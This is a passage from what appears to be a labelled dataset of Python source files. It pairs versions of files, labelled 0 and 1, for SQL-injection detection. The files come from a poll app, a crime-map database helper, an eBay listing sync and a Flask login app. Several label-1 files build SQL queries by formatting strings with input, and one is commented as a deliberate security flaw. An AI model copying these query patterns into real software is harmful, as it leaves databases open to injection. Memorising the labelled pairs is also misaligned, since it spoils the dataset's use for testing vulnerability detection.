:D\n    options = list(filter(lambda x: x, options_string.split(\",\")))\n    # check if multi-choice\n    if len(options) > 1:\n        if not isMultiChoice(poll_name):\n            raise ValueError(\"multiple options for single choice\")\n\n    for opt in options:\n        incrementOption(c, poll_name, opt)\n\n    closeDB(conn)\n\ndef getOptionCount(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    req = \"SELECT \\\"count\\\" FROM {table} WHERE \\\"name_option\\\" = '{key}'\".format(\n                    table=CFG(\"options_table_name\"),key=key)\n    count = queryOne(c, req)\n    if count == None:\n        raise AssertionError(\"Unknown answer for poll. WTF?\")\n    return count;\n\ndef getResults(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT options from {} where name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    options_str = queryOne(c, req)\n\n    if not options_str:\n        raise LookupError(\"Poll '{}' not found in DB\".format(poll_name))\n\n    total = 0\n    options = options_str.split(\",\")\n    results = dict()\n    for opt in options:\n        count = getOptionCount(c, poll_name, opt)\n        total += int(count)\n        results.update({opt:count})\n\n    conn.close()\n    return (results, total)\n\ndef insertOption(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    count = 0\n    params = (key, count)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"options_table_name\"))\n    c.execute(req, params)\n\ndef getTokensExternal(poll_name):\n    req = \"SELECT token FROM {} WHERE name='{}'\".format(CFG(\"tokens_table_name\"), poll_name)\n    conn, c = connectDB()\n    tmp = queryAll(c, req)\n    conn.close()\n    return tmp\n\ndef genSingleToken(length=5):\n    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))\n\ndef genTokens(c, poll_name, count=False):\n    if not count:\n        count = CFG(\"default_token_count\")\n\n    tokens = [ genSingleToken() for x in range(0,count) ]\n    for token in tokens:\n        name = poll_name \n        options_selected = \"NONE\"\n        params = (token, name, options_selected)\n        req = \"INSERT INTO {} VALUES (?, ?, ?)\".format(CFG(\"tokens_table_name\"))\n        c.execute(req, params)\n    return tokens\n\ndef genTokensExternal(poll_name, count=False):\n    conn, c = connectDB()\n    tok = genTokens(c, poll_name, count)\n    closeDB(conn)\n    return tok\n\ndef createAdminToken(c, poll_name):\n    adm_token = genSingleToken()\n    params = (adm_token, poll_name)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"admintoken_table_name\"))\n    c.execute(req, params)\n\ndef getAdmToken(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT adm_token FROM {} WHERE poll_name='{}'\".format(CFG(\"admintoken_table_name\"), poll_name)\n    admtok = queryOne(c, req)\n    closeDB(conn)\n    return admtok\n\ndef checkPollExists(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT EXISTS( SELECT 1 FROM {} WHERE name='{}')\".format(CFG(\"poll_table_name\"), poll_name)\n    tmp = queryOne(c, req)\n    conn.close()\n    return tmp\n\ndef createPoll(poll_name, options_arr, question, has_tokens, multi, openresults=True):\n    if checkPollExists(poll_name):\n        raise RuntimeError(\"Cannot create poll, because the poll already exists.\")\n    conn, c = connectDB()\n\n    # actual poll\n    name = poll_name\n    options = \",\".join(options_arr)\n    date = \"NONE\"\n    show_results = openresults\n    params = (name, options, has_tokens, show_results, question, multi, date) \n    req = \"INSERT INTO {} VALUES (?,?,?,?,?,?,?)\".format(CFG(\"poll_table_name\"))\n    c.execute(req, params)\n\n    # tokens if needed\n    tokens = []\n    if has_tokens:\n        tokens = genTokens(c, poll_name)\n\n    # adminAccessToken\n    createAdminToken(c, poll_name)\n\n    # update options\n    for opt in options_arr:\n        insertOption(c, poll_name, opt)\n    \n    closeDB(conn)\n    return tokens\n\ndef getOptions(poll_name):\n    conn, c = connectDB()\n    options_str = queryOne(c, \"SELECT options FROM {} WHERE name='{}'\".format(CFG(\"poll_table_name\"), poll_name))\n    if options_str == None:\n        return None\n    options = options_str.split(\",\")\n    closeDB(conn)\n    return options\n/n/n/n", "label": 1}, {"id": "d54c54c41c6f6fc9a1430eb7f6b8b663540400e0", "code": "dbhelper.py/n/nimport pymysql\nimport dbconfig\n\n\nclass DBHelper:\n\n    def connect(self, database='crimemap'):\n        return pymysql.connect(host='localhost',\n                                user=dbconfig.db_user,\n                                password=dbconfig.db_password,\n                                db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            query = \"INSERT INTO crimes (description) VALUES (%s);\"\n            with connection.cursor() as cursor:\n                cursor.execute(query, data)\n                connection.commit()\n        finally:\n            connection.close()\n        \n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()/n/n/n", "label": 0}, {"id": "d54c54c41c6f6fc9a1430eb7f6b8b663540400e0", "code": "/dbhelper.py/n/nimport pymysql\nimport dbconfig\n\n\nclass DBHelper:\n\n    def connect(self, database='crimemap'):\n        return pymysql.connect(host='localhost',\n                                user=dbconfig.db_user,\n                                password=dbconfig.db_password,\n                                db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw\n            # See section on SQL injection below\n            query = \"INSERT INTO crimes (description) VALUES \\\n                    ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n        \n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()/n/n/n", "label": 1}, {"id": "090e492d02ed75ff8b39c9460a105da1c0b221e9", "code": "erpnext_ebay/ebay_active_listings.py/n/n\"\"\"ebay active listings\nrun from: premium report, garagsale_xml\n\"\"\"\n\nfrom __future__ import unicode_literals\nfrom __future__ import print_function\nimport __builtin__ as builtins\n\n\nimport sys\nimport os.path\nimport datetime\nfrom datetime import date\nfrom types import MethodType\nimport string\n\nimport frappe\nfrom frappe import msgprint\n#from frappe.utils import cstr\n\nsys.path.insert(0, \"/Users/ben/dev/ebaysdk-python/dist/ebaysdk-2.1.5-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/ebaysdk-2.1.4-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/lxml-3.6.4-py2.7-linux-i686.egg\")\n\nfrom ebaysdk.exception import ConnectionError\nfrom ebaysdk.trading import Connection as Trading\n\nsys.path.insert(0, frappe.get_app_path('unigreenscheme'))\nPATH_TO_YAML = os.path.join(\n    os.sep, frappe.utils.get_bench_path(), 'sites', frappe.get_site_path(), 'ebay.yaml')\n\n\ndef update_sold_statusDONOTUSE():\n    sql = \"\"\"\n    DONT DO THIS UNLESS ABSOLUTELT SURE ABOUT QTY BETTER TO DO VIA IMPORT???????\n    update set it.workflow_state = 'Sold'\n\n    select it.item_code, bin.actual_qty\n    from `tabItem` it\n    right join `tabBin` bin\n    on bin.item_code = it.item_code\n\n    right join `zEbayListings` el\n    on el.sku = it.item_code\n    where el.qty =0 and bin.actual_qty =0\n    \"\"\"\n\n\n@frappe.whitelist()\ndef generate_active_ebay_data():\n    \"\"\"Get all the active eBay listings and save them to table\"\"\"\n\n    # set up the zEbayListings table\n    create_ebay_listings_table()\n\n    page = 1\n    listings_dict = get_myebay_selling_request(page)\n    pages = int(listings_dict['ActiveList']['PaginationResult']['TotalNumberOfPages'])\n    #timestamp = listings_dict['Timestamp']\n\n    while pages >= page:\n\n        for item in listings_dict['ActiveList']['ItemArray']['Item']:\n            ebay_id = item['ItemID']\n            qty = int(item['QuantityAvailable'])\n            sku = item.get('SKU', '')\n            #price = item['BuyItNowPrice']['value']\n            #THSI IS 0        print(item['BuyItNowPrice']['value'])\n            #Example: {'_currencyID': 'USD', 'value': '0.0'}   print(item['BuyItNowPrice'])\n            curr_ebay_price = float(item['SellingStatus']['CurrentPrice']['value'])\n            curr_ex_vat = curr_ebay_price / 1.2  # TODO VAT RATE\n            #currency = item['SellingStatus']['CurrentPrice']['_currencyID']  # or ['Currency']\n            #converted_price = item['ListingDetails]['ConvertedBuyItNowPrice']['value']\n            #description = item['Description']\n            hit_count = 0  # int(item['HitCount'])\n            watch_count = 0  # int(item['WatchCount'])\n            question_count = 0  # int(item['TotalQuestionCount'])\n            #title = item['Title']\n            #conv_title = title.encode('ascii', 'ignore').decode('ascii')\n            #new_title = MySQLdb.escape_string(conv_title)\n            site = ''\n            insert_ebay_listing(\n                sku, ebay_id, qty, curr_ebay_price, site, hit_count, watch_count, question_count)\n\n        page += 1\n        if pages >= page:\n            listings_dict = get_myebay_selling_request(page)\n        else:\n            break\n\n\ndef get_myebay_selling_request(page):\n    \"\"\"get_myebay_selling_request\"\"\"\n    try:\n        api_trading = Trading(config_file=PATH_TO_YAML, warnings=True, timeout=20)\n\n        api_request = {\n            \"ActiveList\": {\n                \"Include\": True,\n                \"Pagination\": {\n                    \"EntriesPerPage\": 100,\n                    \"PageNumber\": page\n                    },\n                \"IncludeWatchCount\": True\n                },\n            'DetailLevel': 'ReturnAll'\n            }\n\n        api_trading.execute('GetMyeBaySelling', api_request)\n        products = api_trading.response.dict()\n\n    except ConnectionError as e:\n        print(e)\n        print(e.response.dict())\n        raise e\n\n    return products\n\n\ndef create_ebay_listings_table():\n    \"\"\"Set up the zEbayListings temp table\"\"\"\n\n    sql = \"\"\"\n        create table if not exists `zEbayListings` (\n        `sku` varchar(20),\n        `ebay_id` varchar(38),\n        `qty` integer,\n        `price` decimal(18,6),\n        `site` varchar(6),\n        `hit_count` integer,\n        `watch_count` integer,\n        `question_count` integer\n        );\n    \"\"\"\n\n    frappe.db.sql(sql, auto_commit=True)\n\n    sql2 = \"\"\"truncate table `zEbayListings`;\"\"\"\n\n    frappe.db.sql(sql2, auto_commit=True)\n\n\ndef insert_ebay_listing(sku, ebay_id, qty, price,\n                        site, hits, watches, questions):\n    \"\"\"insert ebay listings into a temp table\"\"\"\n\n    sql = \"\"\"\n        INSERT INTO `zEbayListings`\n            VALUES (%s, %s, %s, %s, %s, %s, %s, %s);\n        \"\"\"\n    parameters = (sku, ebay_id, qty, price, site, hits, watches, questions)\n\n    frappe.db.sql(sql, parameters, auto_commit=True)\n\n\n# *********************************************\n# ***********  EBAY ID SYNCING CODE ***********\n# *********************************************\n\n\n# if item is on ebay then set the ebay_id field\ndef set_item_ebay_id(item_code, ebay_id):\n    \"\"\"Given an item_code set the ebay_id field to the live eBay ID\n    also does not overwrite Awaiting Garagesale if ebay_id is blank\n    \"\"\"\n    if ebay_id == '':\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            and it.ebay_id <> '{}'\n            \"\"\".format(ebay_id, item_code, 'Awaiting Garagesale')\n    else:\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            \"\"\".format(ebay_id, item_code)\n\n    try:\n        frappe.db.sql(sql, auto_commit=True)\n\n    except Exception as inst:\n        print(\"Unexpected error running ebay_id sync.\", item_code)\n        raise\n\n    return True\n\n\n@frappe.whitelist()\ndef set_item_ebay_first_listed_date():\n    \"\"\"\n    Given an ebay_id set the first listed on date.\n    \n    select it.item_code from `tabItem` it\n    where it.on_sale_from_date is NULL\n    and it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"\n\n    date_today = date.today()\n\n    sql = \"\"\"\n        UPDATE `tabItem` it\n            SET it.on_sale_from_date = %s\n            WHERE it.on_sale_from_date is NULL\n                AND it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"\n\n    try:\n        frappe.db.sql(sql, (date_today.isoformat()), auto_commit=True)\n\n    except Exception as inst:\n        print(\"Unexpected error setting first listed date.\")\n        raise\n\n\ndef sync_ebay_ids():\n    \"\"\"Return only items that don't match\"\"\"\n\n    sql = \"\"\"\n    select * from (\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        LEFT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n        UNION\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        RIGHT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n    ) as t\n    where t.live_ebay_id <> t.dead_ebay_id\n    \"\"\"\n\n    records = frappe.db.sql(sql, as_dict=True)\n\n    for r in records:\n\n        # If not live id then clear any value on system (unless Awaiting Garagaesale)\n        if r.live_ebay_id == '':\n            set_item_ebay_id(r.item_code, '')\n        else:\n            # ok so item is live but id's don't match so update system with live version\n            if r.item_code:\n                set_item_ebay_id(r.sku, r.live_ebay_id)\n            else:\n                msgprint(\n                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id',\n                    r.live_ebay_id)\n/n/n/n", "label": 0}, {"id": "090e492d02ed75ff8b39c9460a105da1c0b221e9", "code": "/erpnext_ebay/ebay_active_listings.py/n/n\"\"\"ebay active listings\nrun from: premium report, garagsale_xml\n\"\"\"\n\nfrom __future__ import unicode_literals\nfrom __future__ import print_function\nimport __builtin__ as builtins\n\n\nimport sys\nimport os.path\nimport datetime\nfrom datetime import date\nfrom types import MethodType\nimport string\n\nimport frappe\nfrom frappe import msgprint\n#from frappe.utils import cstr\n\nsys.path.insert(0, \"/Users/ben/dev/ebaysdk-python/dist/ebaysdk-2.1.5-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/ebaysdk-2.1.4-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/lxml-3.6.4-py2.7-linux-i686.egg\")\n\nfrom ebaysdk.exception import ConnectionError\nfrom ebaysdk.trading import Connection as Trading\nimport ugssettings\n\nsys.path.insert(0, frappe.get_app_path('unigreenscheme'))\nPATH_TO_YAML = os.path.join(\n    os.sep, frappe.utils.get_bench_path(), 'sites', frappe.get_site_path(), 'ebay.yaml')\n\n\n\ndef update_sold_statusDONOTUSE():\n    \n    sql = \"\"\"\n    DONT DO THIS UNLESS ABSOLUTELT SURE ABOUT QTY BETTER TO DO VIA IMPORT???????\n    update set it.workflow_state = 'Sold'\n\n    select it.item_code, bin.actual_qty\n    from `tabItem` it\n    right join `tabBin` bin\n    on bin.item_code = it.item_code\n\n    right join `zEbayListings` el\n    on el.sku = it.item_code\n    where el.qty =0 and bin.actual_qty =0\n    \"\"\"\n\n\n@frappe.whitelist()\ndef generate_active_ebay_data():\n    \"\"\"Get all the active eBay listings and save them to table\"\"\"\n\n    # set up the zEbayListings table\n    create_ebay_listings_table()\n\n    page = 1\n    listings_dict = get_myebay_selling_request(page)\n    pages = int(listings_dict['ActiveList']['PaginationResult']['TotalNumberOfPages'])\n    #timestamp = listings_dict['Timestamp']\n\n    while pages >= page:\n\n        for item in listings_dict['ActiveList']['ItemArray']['Item']:\n            ebay_id = item['ItemID']\n            qty = int(item['QuantityAvailable'])\n            try:\n                sku = item['SKU']\n            except:\n                sku = ''\n            #price = item['BuyItNowPrice']['value']\n            #THSI IS 0        print(item['BuyItNowPrice']['value'])\n            #Example: {'_currencyID': 'USD', 'value': '0.0'}   print(item['BuyItNowPrice'])\n            curr_ebay_price = float(item['SellingStatus']['CurrentPrice']['value'])\n            curr_ex_vat = curr_ebay_price / ugssettings.VAT\n            #currency = item['SellingStatus']['CurrentPrice']['_currencyID']  # or ['Currency']\n            #converted_price = item['ListingDetails]['ConvertedBuyItNowPrice']['value']\n            #description = item['Description']\n            hit_count = 0 #int(item['HitCount'])\n            watch_count = 0 #int(item['WatchCount'])\n            question_count = 0 # int(item['TotalQuestionCount'])\n            #title = item['Title']\n            #conv_title = title.encode('ascii', 'ignore').decode('ascii')\n            #new_title = MySQLdb.escape_string(conv_title)\n            site = ''\n            insert_ebay_listing(\n                sku, ebay_id, qty, curr_ebay_price, site, hit_count, watch_count, question_count)\n\n        page += 1\n        if pages >= page:\n            listings_dict = get_myebay_selling_request(page)\n        else:\n            break\n\n\n\n\ndef get_myebay_selling_request(page):\n    \"\"\"get_myebay_selling_request\"\"\"\n    try:\n        api_trading = Trading(config_file=PATH_TO_YAML, warnings=True, timeout=20)\n\n        api_request = {\n            \"ActiveList\":{\n                \"Include\": True,\n                \"Pagination\": {\n                    \"EntriesPerPage\": 100,\n                    \"PageNumber\": page\n                    },\n                \"IncludeWatchCount\": True\n            },\n            'DetailLevel': 'ReturnAll'\n        }\n\n        api_trading.execute('GetMyeBaySelling', api_request)\n        products = api_trading.response.dict()\n\n\n    except ConnectionError as e:\n        print(e)\n        print(e.response.dict())\n        raise e\n\n    return products\n\n\n\n\n\n\n\ndef create_ebay_listings_table():\n    \"\"\"Set up the zEbayListings temp table\"\"\"\n\n    sql = \"\"\"\n        create table if not exists `zEbayListings` (\n        `sku` varchar(20),\n        `ebay_id` varchar(38),\n        `qty` integer,\n        `price` decimal(18,6),\n        `site` varchar(6),\n        `hit_count` integer,\n        `watch_count` integer,\n        `question_count` integer\n        )\n    \"\"\"\n\n    frappe.db.sql(sql, auto_commit=True)\n\n    sql2 = \"\"\"truncate table `zEbayListings` \"\"\"\n\n    frappe.db.sql(sql2, auto_commit=True)\n\n\ndef insert_ebay_listing(sku, ebay_id, qty, price,\n                        site, hits, watches, questions):\n    \"\"\"insert ebay listings into a temp table\"\"\"\n\n    sql = \"\"\"\n    insert into `zEbayListings`\n    values('{sku}', '{ebay_id}', {qty}, {price}, '{site}', {hit_count}, {watch_count}, {question_count})\n    \"\"\".format(sku=sku, ebay_id=ebay_id, qty=qty, price=price, site=site,\n               hit_count=hits, watch_count=watches, question_count=questions)\n\n\n    frappe.db.sql(sql, auto_commit=True)\n\n\n\n\n\n\n\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n\n\n# if item is on ebay then set the ebay_id field\ndef set_item_ebay_id(item_code, ebay_id):\n    \"\"\"Given an item_code set the ebay_id field to the live eBay ID\n    also does not overwrite Awaiting Garagesale if ebay_id is blank\n    \"\"\"\n    if ebay_id == '':\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            and it.ebay_id <> '{}'\n            \"\"\".format(ebay_id, item_code, 'Awaiting Garagesale')\n    else:\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            \"\"\".format(ebay_id, item_code)\n\n    try:\n        frappe.db.sql(sql, auto_commit=True)\n\n\n    except Exception as inst:\n        print(\"Unexpected error running ebay_id sync.\", item_code)\n        raise\n\n    return True\n\n\n\n@frappe.whitelist()\ndef set_item_ebay_first_listed_date():\n    \"\"\"\n    Given an ebay_id set the first listed on date.\n    \n    select it.item_code from `tabItem` it\n    where it.on_sale_from_date is NULL\n    and it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"\n\n    date_today = date.today()\n\n    sql = \"\"\"\n    update `tabItem` it\n    set it.on_sale_from_date = '%s'\n    where it.on_sale_from_date is NULL\n    and it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"%date_today.isoformat()\n\n    try:\n        frappe.db.sql(sql, auto_commit=True)\n\n    except Exception as inst:\n        print(\"Unexpected error setting first listed date.\")\n        raise\n\n\ndef sync_ebay_ids():\n    \"\"\"Return only items that don't match\"\"\"\n\n    sql = \"\"\"\n    select * from (\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        LEFT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n        UNION\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        RIGHT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n    ) as t\n    where t.live_ebay_id <> t.dead_ebay_id\n    \"\"\"\n\n    records = frappe.db.sql(sql, as_dict=True)\n\n\n    for r in records:\n\n        # If not live id then clear any value on system (unless Awaiting Garagaesale)\n        if r.live_ebay_id == '':\n            set_item_ebay_id(r.item_code, '')\n        else:\n            # ok so item is live but id's don't match so update system with live version\n            if r.item_code:\n                set_item_ebay_id(r.sku, r.live_ebay_id)\n\n            else:\n                msgprint(\n                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id', r.live_ebay_id)\n/n/n/n", "label": 1}, {"id": "ae8497f08cf390130db238bda6af40cf96f7b00a", "code": "run.py/n/nimport os\r\n\r\nimport configparser\r\nfrom flask_bcrypt import Bcrypt\r\nfrom flask import Flask, render_template, request, flash, session, redirect, url_for\r\nfrom forms import Last_FM_Form\r\nimport mysql.connector\r\n\r\n# Read configuration from file.\r\nconfig = configparser.ConfigParser()\r\nconfig.read('config.ini')\r\n\r\n# Set up application server.\r\napp = Flask(__name__)\r\nbcrypt = Bcrypt(app)\r\napp.secret_key = \"adbi327fds\"\r\n\r\n# Create a function for fetching data from the database.\r\ndef sql_query(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    result = cursor.fetchall()\r\n    cursor.close()\r\n    db.close()\r\n    return result\r\n\r\n\r\ndef sql_execute(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    db.commit()\r\n    cursor.close()\r\n    db.close()\r\n\r\n# For this example you can select a handler function by\r\n# uncommenting one of the @app.route decorators.\r\n\r\n#@app.route('/')\r\ndef basic_response():\r\n    return \"It works!\" #example\r\n\r\n# This route involves some LOGIN stuff, not implemented yet\t\r\n#@app.route('/login', methods = ['GET', 'POST'])\r\nddef login():\r\n    if 'user' in session:\r\n        return redirect(url_for('dashboard'))\r\n\r\n    message = None\r\n\r\n    if request.method == \"POST\":\r\n        usern = request.form.get(\"username\")\r\n        passw = request.form.get(\"password\").encode('utf-8')\r\n        result = db.execute(\"SELECT * FROM user WHERE username = :u\", {\"u\": usern}).fetchone()\r\n\r\n        if result is not None:\r\n            print(result['password'])\r\n            if bcrypt.check_password_hash(result['password'], passw) is True:\r\n                session['user'] = usern\r\n                return redirect(url_for('dashboard'))\r\n\r\n        message = \"Username or password is incorrect.\"\r\n    return render_template(\"login.html\", message=message)\r\n   \r\n\r\n# route for account registartion\r\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\r\ndef register():\r\n    if 'user' in session:\r\n        return redirect(url_for('dashboard'))\r\n\r\n    message = None\r\n\r\n    if request.method == \"POST\":\r\n        try: \r\n            usern = request.form.get(\"username\")\r\n            passw = request.form.get(\"password\")\r\n            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')\r\n\r\n            result = db.execute(\"INSERT INTO user (username, password) VALUES (:u, :p)\", {\"u\": usern, \"p\": passw_hash})\r\n            db.commit()\r\n\r\n            if result.rowcount > 0:\r\n                session['user'] = usern\r\n                return redirect(url_for('dashboard'))\r\n\r\n        except exc.IntegrityError:\r\n            message = \"Username already exists.\"\r\n            db.execute(\"ROLLBACK\")\r\n            db.commit()\r\n\r\n    return render_template(\"registration.html\", message=message)\r\n\r\n#route for logout\r\n@app.route(\"/logout\")\r\ndef logout():\r\n    session.pop('user', None)\r\n    return redirect(url_for('login'))\r\n   \r\n# Home page after login\r\n@app.route('/home/', methods=['GET', 'POST'])\t\r\n@app.route('/home/<username>', methods=['GET', 'POST'])\r\ndef home(username = None):\r\n\tlastFM = Last_FM_Form(request.form)\r\n\tif request.method == 'POST':\r\n\t\treturn lastFM_results(lastFM, username = username)\r\n\treturn render_template('home.html', username = username, form = lastFM)\r\n\r\n# Gets search results\t\r\n@app.route('/results')\r\ndef lastFM_results(lastFM, username):\r\n\tresults = []\r\n\tsearch_string = lastFM.data['search']\r\n\tif lastFM.data['search'] == '':\r\n\t\t#result = \r\n\t\t#results = result.all()\r\n\t\tresult = []\r\n\t\r\n\tif not results:\r\n\t\tflash('No results could be found for your search, please try again.')\r\n\t\treturn redirect('/home/%s' % username)\r\n\telse:\r\n\t\treturn render_template(lastFM_results.html, results = results)\r\n\r\n# Given code from teacher's example, not used yet\r\n#@app.route('/', methods=['GET', 'POST'])\r\ndef template_response_with_data():\r\n    print(request.form)\r\n    if \"buy-book\" in request.form:\r\n        book_id = int(request.form[\"buy-book\"])\r\n        sql = \"delete from book where id={book_id}\".format(book_id=book_id)\r\n        sql_execute(sql)\r\n    template_data = {}\r\n    sql = \"select id, title from book order by title\"\r\n    books = sql_query(sql)\r\n    template_data['books'] = books\r\n    return render_template('home-w-data.html', template_data=template_data)\r\n\r\nif __name__ == '__main__':\r\n    app.run(**config['app'])\r\n/n/n/n", "label": 0}, {"id": "ae8497f08cf390130db238bda6af40cf96f7b00a", "code": "/run.py/n/nimport os\r\n\r\nimport configparser\r\nfrom flask_bcrypt import Bcrypt\r\nfrom flask import Flask, render_template, request, flash, session, redirect, url_for\r\nfrom forms import Last_FM_Form\r\nimport mysql.connector\r\n\r\n# Read configuration from file.\r\nconfig = configparser.ConfigParser()\r\nconfig.read('config.ini')\r\n\r\n# Set up application server.\r\napp = Flask(__name__)\r\nbcrypt = Bcrypt(app)\r\napp.secret_key = \"adbi327fds\"\r\n\r\n# Create a function for fetching data from the database.\r\ndef sql_query(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    result = cursor.fetchall()\r\n    cursor.close()\r\n    db.close()\r\n    return result\r\n\r\n\r\ndef sql_execute(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    db.commit()\r\n    cursor.close()\r\n    db.close()\r\n\r\n# For this example you can select a handler function by\r\n# uncommenting one of the @app.route decorators.\r\n\r\n#@app.route('/')\r\ndef basic_response():\r\n    return \"It works!\" #example\r\n\r\n# This route involves some LOGIN stuff, not implemented yet\t\r\n#@app.route('/login', methods = ['GET', 'POST'])\r\ndef login():\r\n   if request.method == 'POST':\r\n      session['username'] = request.form['username']\r\n      return redirect(url_for('index'))\r\n   #return render_template('login.html', )\r\n\r\n# route for account registartion\r\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\r\ndef register():\r\n    if 'user' in session:\r\n        return redirect(url_for('dashboard'))\r\n\r\n    message = None\r\n\r\n    if request.method == \"POST\":\r\n        try: \r\n            usern = request.form.get(\"username\")\r\n            passw = request.form.get(\"password\")\r\n            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')\r\n\r\n            result = db.execute(\"INSERT INTO accounts (username, password) VALUES (:u, :p)\", {\"u\": usern, \"p\": passw_hash})\r\n            db.commit()\r\n\r\n            if result.rowcount > 0:\r\n                session['user'] = usern\r\n                return redirect(url_for('dashboard'))\r\n\r\n        except exc.IntegrityError:\r\n            message = \"Username already exists.\"\r\n            db.execute(\"ROLLBACK\")\r\n            db.commit()\r\n\r\n    return render_template(\"registration.html\", message=message)\r\n\r\n#route for logout\r\n@app.route(\"/logout\")\r\ndef logout():\r\n    session.pop('user', None)\r\n    return redirect(url_for('login'))\r\n   \r\n# Home page after login\r\n@app.route('/home/', methods=['GET', 'POST'])\t\r\n@app.route('/home/<username>', methods=['GET', 'POST'])\r\ndef home(username = None):\r\n\tlastFM = Last_FM_Form(request.form)\r\n\tif request.method == 'POST':\r\n\t\treturn lastFM_results(lastFM, username = username)\r\n\treturn render_template('home.html', username = username, form = lastFM)\r\n\r\n# Gets search results\t\r\n@app.route('/results')\r\ndef lastFM_results(lastFM, username):\r\n\tresults = []\r\n\tsearch_string = lastFM.data['search']\r\n\tif lastFM.data['search'] == '':\r\n\t\t#result = \r\n\t\t#results = result.all()\r\n\t\tresult = []\r\n\t\r\n\tif not results:\r\n\t\tflash('No results could be found for your search, please try again.')\r\n\t\treturn redirect('/home/%s' % username)\r\n\telse:\r\n\t\treturn render_template(lastFM_results.html, results = results)\r\n\r\n# Given code from teacher's example, not used yet\r\n#@app.route('/', methods=['GET', 'POST'])\r\ndef template_response_with_data():\r\n    print(request.form)\r\n    if \"buy-book\" in request.form:\r\n        book_id = int(request.form[\"buy-book\"])\r\n        sql = \"delete from book where id={book_id}\".format(book_id=book_id)\r\n        sql_execute(sql)\r\n    template_data = {}\r\n    sql = \"select id, title from book order by title\"\r\n    books = sql_query(sql)\r\n    template_data['books'] = books\r\n    return render_template('home-w-data.html', template_data=template_data)\r\n\r\nif __name__ == '__main__':\r\n    app.run(**config['app'])\r\n/n/n/n", "label": 1}, {"id": "ad02c932f85c0f4ed6c1e561efc5edc163347806", "code": "app/__init__.py/n/n# Flask create app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Flask\nfrom .migrations.db import db\n\n\ndef create_app(config_filename):\n    app = Flask(__name__)\n    app.config.from_object(config_filename)\n\n    with app.app_context():\n        pass\n\n    \"\"\" Basic Routes \"\"\"\n\n    # register our blueprints\n    configure_blueprints(app)\n\n    # register extensions\n    configure_extensions()\n\n    return app\n\n\ndef configure_blueprints(app):\n    \"\"\"Configure blueprints .\"\"\"\n    from .questions.api.v1.view import 